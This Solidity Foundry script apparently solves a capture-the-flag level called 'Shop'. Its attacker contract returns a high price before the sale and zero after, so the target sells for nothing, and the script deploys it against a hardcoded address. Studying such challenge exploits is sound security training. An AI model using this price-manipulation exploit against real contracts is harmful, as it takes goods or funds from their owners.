// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {

    IShop target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function attack() external {
        target.buy();
    }

    function price() external view returns (uint256) {
        // First call → return high value
        // Second call → return low value
        if (target.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}

contract ShopSolution is Script {

    function run() external {
        address target = 0xe9Ff70c6636181A933faFBEbcD6cF651ae448118;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. Deploy attacker
        ShopAttack attacker = new ShopAttack(target);

        // 2. Execute attack
        attacker.attack();

        vm.stopBroadcast();
    }
}